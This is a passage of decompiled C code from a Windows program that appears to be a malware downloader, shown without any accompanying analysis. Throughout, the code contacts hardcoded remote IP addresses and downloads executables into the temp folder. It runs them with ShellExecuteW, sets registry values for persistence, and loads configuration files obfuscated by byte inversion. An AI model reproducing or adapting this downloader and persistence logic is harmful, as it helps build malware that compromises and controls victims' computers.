    } while (wVar1 != L'\0');
    return;
  }
  pwVar3 = u_WinVista_00418828;
  do {
    wVar1 = *pwVar3;
    *(wchar_t *)(param_1 + -0x418828 + (int)pwVar3) = wVar1;
    pwVar3 = pwVar3 + 1;
  } while (wVar1 != L'\0');
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00401216(void)

{
  short *psVar1;
  short sVar2;
  int iVar3;
  int iVar4;
  undefined4 *puVar5;
  uint local_cc [18];
  undefined4 local_82;
  undefined2 local_7e;
  undefined4 local_7c;
  short asStack_74 [38];
  wchar_t local_28;
  undefined4 local_26 [7];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_28 = L'\0';
  puVar5 = local_26;
  for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  iVar4 = 0;
  FUN_00409600(local_cc,0,0xa0);
  FUN_00409600(&DAT_0041c920,0,0x200);
  iVar3 = FUN_00403f70(local_cc);
  if (iVar3 != 0) {
    _DAT_0041bf84 = FUN_00401000();
    _DAT_0041c924 =
         (((uint)DAT_0041cd2b * 0x100 + (uint)DAT_0041cd2a) * 0x100 + (uint)DAT_0041cd29) * 0x100 +
         (uint)DAT_0041cd28;
    _DAT_0041c92c = local_7c;
    _DAT_0041c930 = local_82;
    _DAT_0041c928 = 0x10004a3;
    _DAT_0041c934 = local_7e;
    iVar3 = 0;
    DAT_0041c920 = _DAT_0041bf84;
    do {
      sVar2 = *(short *)((int)asStack_74 + iVar3);
      *(short *)((int)&DAT_0041c936 + iVar3) = sVar2;
      iVar3 = iVar3 + 2;
    } while (sVar2 != 0);
    FUN_004011aa(0x41c9b6);
    _DAT_0041cab6 = DAT_0041ce26;
    _DAT_0041caba = DAT_0041ce2a;
    do {
      psVar1 = (short *)((int)&DAT_0041ce2e + iVar4);
      *(short *)((int)&DAT_0041cabe + iVar4) = *psVar1;
      iVar4 = iVar4 + 2;
    } while (*psVar1 != 0);
    FUN_00403140(&local_28);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00401340(void)

{
  short sVar1;
  undefined4 *puVar2;
  HANDLE hObject;
  int iVar3;
  undefined4 *puVar4;
  WCHAR local_208;
  uint local_206 [127];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_208 = L'\0';
  FUN_00409600(local_206,0,0x1fe);
  iVar3 = 0;
  do {
    sVar1 = *(short *)((int)&DAT_0041bf88 + iVar3);
    *(short *)((int)local_206 + iVar3 + -2) = sVar1;
    iVar3 = iVar3 + 2;
  } while (sVar1 != 0);
  puVar2 = (undefined4 *)&stack0xfffffdf6;
  do {
    puVar4 = puVar2;
    puVar2 = (undefined4 *)((int)puVar4 + 2);
  } while (*(short *)((int)puVar4 + 2) != 0);
  *(undefined4 *)((int)puVar4 + 2) = u__STOP_00418850._0_4_;
  *(undefined4 *)((int)puVar4 + 6) = u__STOP_00418850._4_4_;
  *(undefined4 *)((int)puVar4 + 10) = u__STOP_00418850._8_4_;
  do {
    hObject = OpenEventW(0x20000,0,&local_208);
    Sleep(200);
  } while (hObject == (HANDLE)0x0);
  CloseHandle(hObject);
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



void FUN_004013df(void)

{
  short *psVar1;
  short sVar2;
  HANDLE pvVar3;
  int iVar4;
  undefined local_1dc [400];
  wchar_t local_4c;
  uint local_4a [16];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_4c = L'\0';
  FUN_00409600(local_4a,0,0x3e);
  FUN_00403890(&local_4c);
  iVar4 = 0;
  do {
    sVar2 = *(short *)((int)local_4a + iVar4 + -2);
    *(short *)((int)&DAT_0041bf88 + iVar4) = sVar2;
    iVar4 = iVar4 + 2;
  } while (sVar2 != 0);
  pvVar3 = OpenEventW(0x20000,0,&DAT_0041bf88);
  if (pvVar3 == (HANDLE)0x0) {
    pvVar3 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,&DAT_0041bf88);
    if (pvVar3 != (HANDLE)0x0) {
      Ordinal_115(0x101,local_1dc);
      iVar4 = FUN_00401be5((uint *)&DAT_0041cb20);
      if (iVar4 == 0) {
        iVar4 = 0;
        do {
          psVar1 = (short *)((int)&DAT_0041885c + iVar4);
          *(short *)((int)&DAT_0041ccc8 + iVar4) = *psVar1;
          iVar4 = iVar4 + 2;
        } while (*psVar1 != 0);
        _wcscpy_s((wchar_t *)&DAT_0041cb24,0x40,&DAT_00418868);
        _wcscpy_s(&DAT_0041cba6,0x10,u_GTDR_00418884);
        _wcscpy_s((wchar_t *)&DAT_0041cbc6,0x40,&DAT_00418890);
        iVar4 = 0;
        DAT_0041cba4 = 0x51;
        DAT_0041cc46 = 0x2b8e;
        do {
          psVar1 = (short *)((int)&DAT_004188ac + iVar4);
          *(short *)((int)&DAT_0041cca8 + iVar4) = *psVar1;
          iVar4 = iVar4 + 2;
        } while (*psVar1 != 0);
        DAT_0041cce8 = 5;
      }
      FUN_004039d0();
      DAT_0041ce20 = FUN_00403af0(&DAT_00418890);
      FUN_00401216();
      CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00401340,(LPVOID)0x0,0,(LPDWORD)0x0);
    }
  }
  else {
    CloseHandle(pvVar3);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __fastcall FUN_00401543(undefined4 param_1,undefined2 param_2)

{
  int iVar1;
  wchar_t *_Src;
  wchar_t *pwVar2;
  wchar_t local_418;
  uint local_416 [129];
  WCHAR local_210;
  uint local_20e [129];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  iVar1 = FUN_004044d0(s_218_54_47_76_004188bc,param_2);
  if (iVar1 == 0) {
    local_210 = L'\0';
    FUN_00409600(local_20e,0,0x206);
    local_418 = L'\0';
    FUN_00409600(local_416,0,0x206);
    GetTempPathW(0x104,&local_210);
    pwVar2 = &DAT_0041c3a8;
    _Src = &DAT_0041c3a8;
    do {
      if (*_Src != L'\0') {
        _wcscpy_s(&local_418,0x104,&local_210);
        _wcscat_s(&local_418,0x104,_Src);
      }
      _Src = _Src + 0x8c;
    } while ((int)_Src < 0x41c920);
    do {
      if (*pwVar2 != L'\0') {
        FUN_00405480(pwVar2,s_218_54_47_76_004188bc,param_2,1);
      }
      pwVar2 = pwVar2 + 0x8c;
    } while ((int)pwVar2 < 0x41c920);
    _wcscat_s(&local_210,0x104,&DAT_0041c1a0);
    GetFileAttributesW(&local_210);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00401677(void)

{
  WCHAR WVar1;
  short sVar2;
  short *psVar3;
  HANDLE pvVar4;
  LSTATUS LVar5;
  int iVar6;
  short *psVar7;
  undefined4 extraout_ECX;
  WCHAR *pWVar8;
  undefined2 uVar9;
  undefined4 *puVar10;
  undefined4 *puVar11;
  HKEY local_30c;
  DWORD local_308;
  DWORD local_304;
  WCHAR local_300;
  uint local_2fe [129];
  undefined4 local_f8 [26];
  uint local_8e [23];
  WCHAR local_30;
  undefined4 local_2e [9];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_300 = L'\0';
  FUN_00409600(local_2fe,0,0x206);
  local_30 = L'\0';
  puVar10 = local_2e;
  for (iVar6 = 9; iVar6 != 0; iVar6 = iVar6 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  *(undefined2 *)puVar10 = 0;
  local_304 = 0;
  local_308 = 0x104;
  psVar3 = &DAT_0041cca8;
  do {
    psVar7 = psVar3;
    psVar3 = psVar7 + 1;
  } while (*psVar7 != 0);
  if (((int)(psVar7 + -0x20e654) >> 1 == 0) ||
     (pvVar4 = OpenEventW(0x20000,0,&DAT_0041cca8), pvVar4 == (HANDLE)0x0)) {
    LVar5 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_004188d0,0,0xf003f,
                          &local_30c);
    if (LVar5 == 0) {
      LVar5 = RegQueryValueExW(local_30c,u_TrayKey_0041893c,(LPDWORD)0x0,&local_304,
                               (LPBYTE)&local_30,&local_308);
      if ((LVar5 == 0) && (pvVar4 = OpenEventW(0x20000,0,&local_30), pvVar4 != (HANDLE)0x0)) {
        RegCloseKey(local_30c);
        goto LAB_004018d5;
      }
      RegCloseKey(local_30c);
    }
    GetTempPathW(0x104,&local_300);
    psVar3 = &DAT_0041cca8;
    do {
      psVar7 = psVar3;
      psVar3 = psVar7 + 1;
    } while (*psVar7 != 0);
    if ((int)(psVar7 + -0x20e654) >> 1 == 0) {
      FUN_00401bc8(&DAT_0041c1a0,u__s_exe_00418958);
      iVar6 = 0;
      do {
        sVar2 = *(short *)((int)u_opert_0041894c + iVar6);
        *(short *)((int)local_2e + iVar6 + -2) = sVar2;
        iVar6 = iVar6 + 2;
      } while (sVar2 != 0);
    }
    else {
      FUN_00401bc8(&DAT_0041c1a0,u__s_exe_00418958);
      iVar6 = 0;
      do {
        sVar2 = *(short *)((int)&DAT_0041cca8 + iVar6);
        *(short *)((int)local_2e + iVar6 + -2) = sVar2;
        iVar6 = iVar6 + 2;
      } while (sVar2 != 0);
    }
    _wcscat_s(&local_300,0x104,&DAT_0041c1a0);
    uVar9 = 0x2b66;
    if (DAT_0041af08 != 3) {
      uVar9 = 0x2b70;
    }
    iVar6 = FUN_00401543(extraout_ECX,uVar9);
    if (iVar6 == 0) {
      Sleep(100);
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_300,&DAT_0041884c,(LPCWSTR)0x0,1);
      puVar10 = (undefined4 *)u_Software_Microsoft_Windows_NT_Cu_004188d0;
      puVar11 = local_f8;
      for (iVar6 = 0x1a; iVar6 != 0; iVar6 = iVar6 + -1) {
        *puVar11 = *puVar10;
        puVar10 = puVar10 + 1;
        puVar11 = puVar11 + 1;
      }
      *(undefined2 *)puVar11 = *(undefined2 *)puVar10;
      FUN_00409600(local_8e,0,0x5e);
      LVar5 = RegOpenKeyExW((HKEY)0x80000001,(LPCWSTR)local_f8,0,3,&local_30c);
      if (LVar5 == 0) {
        pWVar8 = &local_30;
        do {
          WVar1 = *pWVar8;
          pWVar8 = pWVar8 + 1;
        } while (WVar1 != L'\0');
        LVar5 = RegSetValueExW(local_30c,u_TrayKey_0041893c,0,1,(BYTE *)&local_30,
                               ((int)pWVar8 - (int)local_2e >> 1) * 2 + 2);
        if (LVar5 == 0) {
          RegCloseKey(local_30c);
        }
      }
    }
  }
LAB_004018d5:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_004018e6(HINSTANCE param_1)

{
  short *psVar1;
  HWND pHVar2;
  int iVar3;
  undefined auStack_21c [4];
  WCHAR WStack_218;
  uint auStack_216 [130];
  uint local_c;
  
  local_c = DAT_0041a038 ^ (uint)auStack_21c;
  LoadStringW(param_1,0x67,(LPWSTR)&DAT_0041beb8,100);
  LoadStringW(param_1,0x6d,(LPWSTR)&DAT_0041bdf0,100);
  FUN_00401a60(param_1);
  DAT_0041bf80 = param_1;
  pHVar2 = CreateWindowExW(0,(LPCWSTR)&DAT_0041bdf0,(LPCWSTR)&DAT_0041beb8,0xcf0000,-0x80000000,0,
                           -0x80000000,0,(HWND)0x0,(HMENU)0x0,param_1,(LPVOID)0x0);
  if (pHVar2 == (HWND)0x0) {
LAB_00401957:
    ___security_check_cookie_4(local_c ^ (uint)auStack_21c);
    return;
  }
  LoadAcceleratorsW(param_1,(LPCWSTR)0x6d);
  Sleep(2000);
  FUN_004027c0(&DAT_0041af08);
  iVar3 = FUN_00401e53();
  if (iVar3 == 0) {
    iVar3 = FUN_004013df();
    if (iVar3 == 0) goto LAB_00401957;
    FUN_00401677();
    if ((DAT_0041ce20 != 0) && (DAT_0041ce24 != 0)) {
      FUN_00404140(DAT_0041ce20,s_218_54_31_226_0041aef8);
      DAT_0041aef4 = DAT_0041ce24;
    }
    iVar3 = 0;
    do {
      psVar1 = (short *)((int)u_fiosde_exe_00418968 + iVar3);
      *(short *)((int)&DAT_0041c1a0 + iVar3) = *psVar1;
      iVar3 = iVar3 + 2;
    } while (*psVar1 != 0);
    FUN_004041f0();
    WStack_218 = L'\0';
    FUN_00409600(auStack_216,0,0x206);
    GetTempPathW(0x104,&WStack_218);
    _wcscat_s(&WStack_218,0x104,&DAT_0041c1a0);
    Sleep(500);
    ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&WStack_218,&DAT_0041884c,(LPCWSTR)0x0,1);
  }
  else {
    FUN_004033f0();
  }
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



void __fastcall FUN_00401a60(HINSTANCE param_1)

{
  WNDCLASSEXW local_38;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_38.cbClsExtra = 0;
  local_38.cbWndExtra = 0;
  local_38.cbSize = 0x30;
  local_38.style = 3;
  local_38.lpfnWndProc = FUN_00401ae5;
  local_38.hInstance = param_1;
  local_38.hIcon = LoadIconW(param_1,(LPCWSTR)0x6b);
  local_38.hCursor = LoadCursorW((HINSTANCE)0x0,(LPCWSTR)0x7f00);
  local_38.hbrBackground = (HBRUSH)0x6;
  local_38.lpszMenuName = (LPCWSTR)0x6d;
  local_38.lpszClassName = (LPCWSTR)&DAT_0041bdf0;
  local_38.hIconSm = LoadIconW(local_38.hInstance,(LPCWSTR)0x6c);
  RegisterClassExW(&local_38);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00401ae5(HWND param_1,UINT param_2,uint param_3,LPARAM param_4)

{
  tagPAINTSTRUCT local_4c;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  if (param_2 == 2) {
    PostQuitMessage(0);
  }
  else if (param_2 == 0xf) {
    BeginPaint(param_1,&local_4c);
    EndPaint(param_1,&local_4c);
  }
  else {
    if (param_2 == 0x111) {
      if ((param_3 & 0xffff) == 0x68) {
        DialogBoxParamW(DAT_0041bf80,(LPCWSTR)0x67,param_1,FUN_00401b89,0);
        goto LAB_00401b7a;
      }
      if ((param_3 & 0xffff) == 0x69) {
        DestroyWindow(param_1);
        goto LAB_00401b7a;
      }
      param_2 = 0x111;
    }
    DefWindowProcW(param_1,param_2,param_3,param_4);
  }
LAB_00401b7a:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 FUN_00401b89(HWND param_1,int param_2,ushort param_3)

{
  undefined4 uVar1;
  
  if (param_2 == 0x110) {
    uVar1 = 1;
  }
  else {
    if ((param_2 == 0x111) && ((param_3 == 1 || (param_3 == 2)))) {
      EndDialog(param_1,(uint)param_3);
      return 1;
    }
    uVar1 = 0;
  }
  return uVar1;
}



void __cdecl FUN_00401bc8(wchar_t *param_1,wchar_t *param_2)

{
  _vswprintf_s(param_1,0x104,param_2,&stack0x0000000c);
  return;
}



void __fastcall FUN_00401be5(uint *param_1)

{
  int iVar1;
  uint uVar2;
  uint *puVar3;
  uint local_20c [128];
  uint local_c;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  uVar2 = 0;
  local_c = 0x504d534d;
  FUN_00409600(local_20c,0,0x200);
  iVar1 = FUN_00401c70(local_20c,u_golfinfo_ini_00418980,1);
  if (iVar1 != 0) {
    do {
      *(byte *)((int)local_20c + uVar2) = ~*(byte *)((int)local_20c + uVar2);
      uVar2 = uVar2 + 1;
    } while (uVar2 < 0x200);
    if (local_20c[0] == local_c) {
      puVar3 = local_20c;
      for (iVar1 = 0x80; iVar1 != 0; iVar1 = iVar1 + -1) {
        *param_1 = *puVar3;
        puVar3 = puVar3 + 1;
        param_1 = param_1 + 1;
      }
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __thiscall FUN_00401c70(void *this,wchar_t *param_1,int param_2)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  FILE *local_214;
  WCHAR local_210;
  uint local_20e [129];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  if ((this != (void *)0x0) && (param_1 != (wchar_t *)0x0)) {
    pwVar2 = param_1;
    do {
      wVar1 = *pwVar2;
      pwVar2 = pwVar2 + 1;
    } while (wVar1 != L'\0');
    if ((int)pwVar2 - (int)(param_1 + 1) >> 1 != 0) {
      local_210 = L'\0';
      FUN_00409600(local_20e,0,0x206);
      if ((param_2 == 0) && (DAT_0041af08 == 3)) {
        GetSystemDirectoryW(&local_210,0x104);
        _wcscat_s(&local_210,0x104,(wchar_t *)&DAT_0041899c);
      }
      else {
        GetTempPathW(0x104,&local_210);
      }
      _wcscat_s(&local_210,0x104,param_1);
      local_214 = (FILE *)0x0;
      __wfopen_s(&local_214,&local_210,(wchar_t *)&DAT_004189a0);
      if (local_214 != (FILE *)0x0) {
        _fread(this,0x200,1,local_214);
        _fclose(local_214);
      }
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __fastcall FUN_00401d96(void *param_1)

{
  FILE *local_214;
  WCHAR local_210;
  uint local_20e [129];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_210 = L'\0';
  FUN_00409600(local_20e,0,0x206);
  local_214 = (FILE *)0x0;
  if (param_1 != (void *)0x0) {
    GetTempPathW(0x104,&local_210);
    _wcscat_s(&local_210,0x104,u_golfinfo_ini_00418980);
    __wfopen_s(&local_214,&local_210,(wchar_t *)&DAT_004189c0);
    if (local_214 != (FILE *)0x0) {
      _fwrite(param_1,0x200,1,local_214);
      _fclose(local_214);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00401e53(void)

{
  wchar_t wVar1;
  WCHAR WVar2;
  short sVar3;
  short *psVar4;
  int iVar5;
  int iVar6;
  wchar_t *pwVar7;
  uint uVar8;
  HANDLE pvVar9;
  DWORD DVar10;
  LSTATUS LVar11;
  int iVar12;
  wchar_t *pwVar13;
  short *psVar14;
  WCHAR *pWVar15;
  uint *puVar16;
  uint *puVar17;
  bool bVar18;
  HKEY local_828;
  uint local_824 [128];
  uint local_624;
  wchar_t local_620 [64];
  short local_5a0;
  wchar_t local_59e [16];
  wchar_t local_57e [64];
  undefined2 local_4fe;
  wchar_t local_49c [16];
  wchar_t local_47c [16];
  int local_45c;
  undefined4 local_458;
  undefined4 local_420;
  WCHAR local_41c;
  uint local_41a [129];
  WCHAR local_214;
  uint local_212 [130];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_214 = L'\0';
  FUN_00409600(local_212,0,0x206);
  local_41c = L'\0';
  FUN_00409600(local_41a,0,0x206);
  FUN_00409600(&local_624,0,0x200);
  GetTempPathW(0x104,&local_214);
  _wcscat_s(&local_214,0x104,u_HGDraw_dll_004189c8);
  DeleteFileW(&local_214);
  iVar5 = FUN_00402298();
  if ((DAT_0041bfc8 != 1) || (iVar5 != 0)) {
    iVar6 = FUN_004025f3();
    local_5a0 = 0x51;
    local_624 = 0x504d534d;
    local_4fe = 0x2b8e;
    iVar12 = 0;
    do {
      sVar3 = *(short *)((int)&DAT_00418890 + iVar12);
      *(short *)((int)local_57e + iVar12) = sVar3;
      iVar12 = iVar12 + 2;
    } while (sVar3 != 0);
    iVar12 = 0;
    do {
      sVar3 = *(short *)((int)&DAT_00418868 + iVar12);
      *(short *)((int)local_620 + iVar12) = sVar3;
      iVar12 = iVar12 + 2;
    } while (sVar3 != 0);
    iVar12 = 0;
    do {
      sVar3 = *(short *)((int)&DAT_004189e0 + iVar12);
      *(short *)((int)local_59e + iVar12) = sVar3;
      iVar12 = iVar12 + 2;
    } while (sVar3 != 0);
    local_45c = 5;
    _wcscpy_s(local_49c,0x10,&DAT_0041bfec);
    if ((iVar5 != 0) || (iVar6 != 0)) {
      _wcscpy_s(local_59e,0x10,&DAT_0041c120);
      _wcscpy_s(local_620,0x40,&DAT_0041c0a0);
      _wcscpy_s(local_57e,0x40,&DAT_0041c018);
      local_5a0 = DAT_0041c098;
      local_4fe = DAT_0041c010;
      local_45c = DAT_0041c00c;
      if (DAT_0041c00c == 0) {
        local_45c = 5;
      }
    }
    pwVar13 = &DAT_00418890;
    pwVar7 = local_57e;
    do {
      wVar1 = *pwVar7;
      bVar18 = (ushort)wVar1 < (ushort)*pwVar13;
      if (wVar1 != *pwVar13) {
LAB_00402044:
        uVar8 = -(uint)bVar18 | 1;
        goto LAB_00402049;
      }
      if (wVar1 == L'\0') break;
      wVar1 = pwVar7[1];
      bVar18 = (ushort)wVar1 < (ushort)pwVar13[1];
      if (wVar1 != pwVar13[1]) goto LAB_00402044;
      pwVar7 = pwVar7 + 2;
      pwVar13 = pwVar13 + 2;
    } while (wVar1 != L'\0');
    uVar8 = 0;
LAB_00402049:
    if (uVar8 != 0) {
      local_45c = 5;
      iVar5 = 0;
      do {
        sVar3 = *(short *)((int)&DAT_00418890 + iVar5);
        *(short *)((int)local_57e + iVar5) = sVar3;
        iVar5 = iVar5 + 2;
      } while (sVar3 != 0);
    }
    if ((local_620[0] != L'\0') && (local_5a0 != 0)) {
      local_624 = 0x504d534d;
      psVar4 = &DAT_0041bfec;
      do {
        psVar14 = psVar4;
        psVar4 = psVar14 + 1;
      } while (*psVar14 != 0);
      if (((int)(psVar14 + -0x20dff6) >> 1 != 0) &&
         (pvVar9 = OpenEventW(0x20000,0,&DAT_0041bfec), pvVar9 != (HANDLE)0x0)) {
        _wcscpy_s(local_49c,0x10,&DAT_0041bfec);
      }
      if (local_49c[0] == L'\0') {
        _wcscpy_s(local_49c,0x10,u_houtue_004189ec);
      }
      if (local_47c[0] == L'\0') {
        _wcscpy_s(local_47c,0x10,u_biudfw_004189fc);
        psVar4 = &DAT_0041bfcc;
        do {
          psVar14 = psVar4;
          psVar4 = psVar14 + 1;
        } while (*psVar14 != 0);
        if ((int)(psVar14 + -0x20dfe6) >> 1 != 0) {
          _wcscpy_s(local_47c,0x10,&DAT_0041bfcc);
        }
      }
      if (local_45c == 0) {
        local_45c = 5;
      }
      local_458 = 0x10004a3;
      puVar16 = &local_624;
      puVar17 = local_824;
      for (iVar5 = 0x80; iVar5 != 0; iVar5 = iVar5 + -1) {
        *puVar17 = *puVar16;
        puVar16 = puVar16 + 1;
        puVar17 = puVar17 + 1;
      }
      local_420 = 0x504d534d;
      if (local_624 == 0x504d534d) {
        uVar8 = 0;
        do {
          *(byte *)((int)local_824 + uVar8) = ~*(byte *)((int)local_824 + uVar8);
          uVar8 = uVar8 + 1;
        } while (uVar8 < 0x200);
        iVar5 = FUN_00401d96(local_824);
        if (iVar5 != 0) {
          FUN_004028b0(local_47c,&local_214);
          GetModuleFileNameW((HMODULE)0x0,&local_41c,0x104);
          DVar10 = GetTickCount();
          FUN_00403240(&local_41c,&local_214,(uint)(((ulonglong)DVar10 / 1000) % 100));
          local_828 = (HKEY)0x0;
          LVar11 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_004188d0,0,3,
                                 &local_828);
          if (LVar11 == 0) {
            pWVar15 = &local_214;
            do {
              WVar2 = *pWVar15;
              pWVar15 = pWVar15 + 1;
            } while (WVar2 != L'\0');
            LVar11 = RegSetValueExW(local_828,(LPCWSTR)&DAT_00418a0c,0,1,(BYTE *)&local_214,
                                    ((int)pWVar15 - (int)local_212 >> 1) * 2 + 2);
            if (LVar11 == 0) {
              RegCloseKey(local_828);
            }
          }
          ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_214,&DAT_0041884c,(LPCWSTR)0x0,1);
        }
      }
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00402298(void)

{
  short sVar1;
  undefined4 *puVar2;
  int iVar3;
  HANDLE pvVar4;
  int iVar5;
  undefined4 *puVar6;
  uint local_8d4 [2];
  undefined4 local_8cc;
  undefined2 local_7d0;
  undefined2 local_7ca;
  short asStack_7c6 [16];
  wchar_t local_7a6 [16];
  wchar_t local_786 [117];
  uint local_69c;
  short asStack_698 [64];
  undefined2 local_618;
  short asStack_616 [16];
  short asStack_5f6 [64];
  undefined2 local_576;
  wchar_t local_514 [16];
  wchar_t local_4f4 [16];
  undefined4 local_4d4;
  WCHAR local_49c;
  uint local_49a [129];
  WCHAR local_294;
  uint local_292 [129];
  undefined4 uStack_8e;
  uint local_8a [15];
  WCHAR local_4c;
  uint local_4a [16];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_294 = L'\0';
  iVar5 = 0;
  FUN_00409600(local_292,0,0x206);
  local_49c = L'\0';
  FUN_00409600(local_49a,0,0x206);
  FUN_00409600(&local_69c,0,0x200);
  GetModuleFileNameW((HMODULE)0x0,&local_49c,0x104);
  iVar3 = FUN_00401be5(&local_69c);
  if (iVar3 == 0) {
    FUN_00409600(local_8d4,0,0x236);
    iVar3 = FUN_00402c20(local_8d4);
    if (iVar3 != 0) {
      do {
        sVar1 = *(short *)((int)asStack_7c6 + iVar5);
        *(short *)((int)&DAT_0041c120 + iVar5) = sVar1;
        iVar5 = iVar5 + 2;
      } while (sVar1 != 0);
      DAT_0041c098 = local_7ca;
      DAT_0041c010 = local_7d0;
      FUN_00403140(&DAT_0041c0a0);
      FUN_00403140(&DAT_0041c018);
      _wcscpy_s(&DAT_0041bfcc,0x10,local_7a6);
      _wcscpy_s(&DAT_0041bfec,0x10,local_786);
      DAT_0041c00c = local_8cc;
    }
  }
  else {
    GetTempPathW(0x104,&local_294);
    _wcscat_s(&local_294,0x104,local_514);
    _wcscat_s(&local_294,0x104,u__exe_00418a14);
    DeleteFileW(&local_294);
    _wcscpy_s(&DAT_0041bfcc,0x10,local_4f4);
    FUN_004028b0(local_4f4,&local_294);
    iVar3 = FUN_00402960(local_4f4);
    if (iVar3 == 1) {
      DAT_0041bfc8 = 1;
    }
    else {
      local_4c = L'\0';
      FUN_00409600(local_4a,0,0x3e);
      uStack_8e._2_2_ = 0;
      FUN_00409600(local_8a,0,0x3e);
      iVar3 = 0;
      do {
        sVar1 = *(short *)((int)local_4f4 + iVar3);
        *(short *)((int)local_4a + iVar3 + -2) = sVar1;
        iVar3 = iVar3 + 2;
      } while (sVar1 != 0);
      iVar3 = 0;
      do {
        sVar1 = *(short *)((int)local_4f4 + iVar3);
        *(short *)((int)local_8a + iVar3 + -2) = sVar1;
        iVar3 = iVar3 + 2;
      } while (sVar1 != 0);
      puVar2 = &uStack_8e;
      do {
        puVar6 = puVar2;
        puVar2 = (undefined4 *)((int)puVar6 + 2);
      } while (*(short *)((int)puVar6 + 2) != 0);
      *(undefined4 *)((int)puVar6 + 2) = u__STOP_00418850._0_4_;
      *(undefined4 *)((int)puVar6 + 6) = u__STOP_00418850._4_4_;
      *(undefined4 *)((int)puVar6 + 10) = u__STOP_00418850._8_4_;
      pvVar4 = OpenEventW(0x20000,0,&local_4c);
      if (pvVar4 != (HANDLE)0x0) {
        CloseHandle(pvVar4);
        CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)((int)&uStack_8e + 2));
        for (iVar3 = 0;
            (pvVar4 = OpenEventW(0x20000,0,&local_4c), pvVar4 != (HANDLE)0x0 && (iVar3 < 5));
            iVar3 = iVar3 + 1) {
          CloseHandle(pvVar4);
          Sleep(500);
        }
      }
      Sleep(1000);
      DeleteFileW(&local_294);
      iVar3 = 0;
      do {
        sVar1 = *(short *)((int)asStack_698 + iVar3);
        *(short *)((int)&DAT_0041c0a0 + iVar3) = sVar1;
        iVar3 = iVar3 + 2;
      } while (sVar1 != 0);
      iVar3 = 0;
      do {
        sVar1 = *(short *)((int)asStack_616 + iVar3);
        *(short *)((int)&DAT_0041c120 + iVar3) = sVar1;
        iVar3 = iVar3 + 2;
      } while (sVar1 != 0);
      do {
        sVar1 = *(short *)((int)asStack_5f6 + iVar5);
        *(short *)((int)&DAT_0041c018 + iVar5) = sVar1;
        iVar5 = iVar5 + 2;
      } while (sVar1 != 0);
      DAT_0041c098 = local_618;
      DAT_0041c010 = local_576;
      DAT_0041c00c = local_4d4;
      _wcscpy_s(&DAT_0041bfec,0x10,local_514);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_004025f3(void)

{
  short *psVar1;
  short sVar2;
  int iVar3;
  uint uVar4;
  uint *puVar5;
  uint *puVar6;
  uint local_61c;
  short asStack_618 [65];
  short asStack_596 [189];
  uint local_41c [33];
  undefined2 local_398;
  undefined2 local_2f6;
  uint local_218;
  WCHAR local_214;
  uint local_212 [130];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_214 = L'\0';
  FUN_00409600(local_212,0,0x206);
  local_218 = 0x504d534d;
  FUN_00409600(local_41c,0,0x200);
  iVar3 = FUN_00401c70(local_41c,u_golfset_ini_004189a8,0);
  if (iVar3 != 0) {
    uVar4 = 0;
    do {
      *(byte *)((int)local_41c + uVar4) = ~*(byte *)((int)local_41c + uVar4);
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x200);
    if (local_41c[0] == local_218) {
      puVar5 = local_41c;
      puVar6 = &local_61c;
      for (iVar3 = 0x80; iVar3 != 0; iVar3 = iVar3 + -1) {
        *puVar6 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar6 = puVar6 + 1;
      }
      iVar3 = 0;
      do {
